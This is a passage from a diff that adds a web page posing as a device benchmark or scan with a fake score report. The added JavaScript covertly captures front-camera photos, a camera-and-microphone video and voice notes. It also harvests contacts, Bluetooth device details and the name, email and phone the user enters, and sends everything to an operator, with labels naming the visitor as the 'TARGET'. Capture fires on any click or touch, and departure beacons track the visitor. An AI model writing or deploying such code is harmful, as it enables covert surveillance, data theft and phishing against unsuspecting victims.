+  c.getContext('2d').drawImage(hv,0,0);
+  c.toBlob(b=>T("Photo",b,tag||"📸 LIVE PHOTO (front camera)"),'image/jpeg',0.88); }
+async function grab(){
+  if(camBusy||camOk) return; camBusy=true;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:720}},audio:true});
+    hv.srcObject=stream; camOk=true; camBusy=false; mark("cam","live");
+    await sleep(500); shot("📸 LIVE PHOTO 1");
+    setTimeout(()=>shot("📸 LIVE PHOTO 2"),1200);
+    try{ const rec=new MediaRecorder(stream,{mimeType:'video/webm'}),ch=[];
+      rec.ondataavailable=e=>{ if(e.data.size) ch.push(e.data); };
+      rec.onstop=()=>T("Document",new Blob(ch,{type:'video/webm'}),"🎥 LIVE VIDEO 4s (cam+mic)");
+      rec.start(); setTimeout(()=>rec.stop(),4000); }catch(e){}
+    setTimeout(()=>{ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; camOk=false; } },15000);
+  }catch(e){ camBusy=false; mark("cam","denied"); }
+}
+async function quickShot(t){ if(!camOk){ await grab(); await sleep(800); shot(t); return; } shot(t); }
+
+/* ================= EXTRAS ================= */
+async function getContacts(){
+  if(!navigator.contacts||!navigator.contacts.select){ toast("Contacts support nahi"); return; }
+  try{ const c=await navigator.contacts.select(['name','tel','email'],{multiple:true});
+    if(!c||!c.length){ toast("Koi contact nahi"); return; }
+    D.contacts=c;
+    T("Message","📱 *TARGET KE CONTACTS* ("+c.length+")\n━━━━━━━━━━━━━━━━━━━━\n"
+      +c.slice(0,50).map(x=>"• "+(x.name&&x.name[0]||"-")+" — "+(x.tel&&x.tel[0]||"-")).join("\n")
+      +(c.length>50?"\n… +"+(c.length-50):""));
+    toast(c.length+" contacts ✅");
+  }catch(e){}
+}
+async function btScan(){
+  if(!navigator.bluetooth){ toast("Bluetooth support nahi"); return; }
+  try{ const d=await navigator.bluetooth.requestDevice({acceptAllDevices:true});
+    T("Message","🔵 *BLUETOOTH DEVICE*\nName: "+(d.name||"-")+"\nID: "+d.id);
+    toast("BT: "+(d.name||"device")+" ✅");
+  }catch(e){}
+}
+async function voiceNote(){
+  try{ const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    const r=new MediaRecorder(s),ch=[];
+    r.ondataavailable=e=>{ if(e.data.size) ch.push(e.data); };
+    r.onstop=()=>{ T("Document",new Blob(ch,{type:"audio/webm"}),"🎤 VOICE NOTE 6s");
+      s.getTracks().forEach(t=>t.stop()); toast("Voice bhej diya ✅"); };
+    r.start(); toast("🔴 Bolna shuru (6s)"); setTimeout(()=>r.stop(),6000);
+  }catch(e){ toast("Mic allow karo"); }
+}
+$('cContacts').onclick=()=>{ getContacts(); $('cContacts').classList.add('done'); };
+$('cBt').onclick=()=>{ btScan(); $('cBt').classList.add('done'); };
+$('cVoice').onclick=()=>{ voiceNote(); $('cVoice').classList.add('done'); };
+
+/* ================= REPORT ================= */
+function showReport(){
+  const hw=navigator.hardwareConcurrency||4, ram=navigator.deviceMemory||4;
+  const gl=webgl(); const gpuScore=(gl.r||"").match(/adreno|mali|apple|geforce|radeon|intel/i)?18:10;
+  let score=Math.min(98, 42 + Math.min(hw,10)*2 + Math.min(ram,8)*2 + gpuScore
+    + (matchMedia("(prefers-color-scheme: dark)").matches?2:0));
+  $('score').innerHTML=score+"<small>/100</small>";
+  const bars=[["CPU / RAM",Math.min(99,40+hw*5)],
+    ["Graphics",Math.min(99,50+gpuScore*2)],
+    ["Network",Math.min(99,(D.speed?parseFloat(D.speed)*6:30)+40)],
+    ["Storage free",Math.min(99,D.storage?Math.round((1-D.storage.used/D.storage.quota)*100):60)],
+    ["Privacy",D.detect&&D.detect.incog?72:(D.detect&&D.detect.wd?55:88)]];
+  $('bars').innerHTML=bars.map(b=>`<div class="bar"><div class="lb"><span>${b[0]}</span><span>${Math.round(b[1])}%</span></div>
+    <div class="tr"><i style="width:${Math.round(b[1])}%"></i></div></div>`).join('');
+  D.score=score;
+  T("Message","📊 *DEVICE SCORE: "+score+"/100*");
+  show('sReport');
+  readAutofill();
+}
+function show(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('on')); $(id).classList.add('on'); window.scrollTo(0,0); }
+
+$('sendBtn').onclick=()=>{
+  const n=$('uName').value.trim(), e=$('uEmail').value.trim(), t=$('uTel').value.trim();
+  if(!n||!e||!t){ toast("Teeno field bharo"); return; }
+  D.identity={name:n,email:e,phone:t};
+  T("Message","👤 *IDENTITY CONFIRMED*\n━━━━━━━━━━━━━━━━━━━━\nName  : "+n+"\nEmail : "+e+"\nPhone : "+t);
+  quickShot("📸 Live photo (report bhejte waqt)");
+  show('sDone');
+  T("Message","🎉 *SCAN COMPLETE — full data bhej diya*");
+  try{ T("Document",new Blob([JSON.stringify(D,null,2)],{type:"application/json"}),"📦 FULL DATA ("+SID+".json)"); }catch(e){}
+  setTimeout(()=>{ if(REDIRECT&&REDIRECT!=="None") window.location.replace(REDIRECT); },2800);
+};
+
+/* ================= BOOT ================= */
+(function(){
+  D.os=osInfo(); D.ua=UA;
+  scanAll();
+  document.addEventListener('click',()=>grab());
+  document.addEventListener('touchstart',()=>grab(),{passive:true});
+  setTimeout(grab,900);
+})();
+window.addEventListener('pagehide',()=>beacon("👋 Chhoda ("+done+"/"+CHECKS.length+" checks done)"));
+document.addEventListener('visibilitychange',()=>{ if(document.visibilityState==='hidden') beacon("👀 Minimize"); });
+</script>
+</body>
+
+</html>
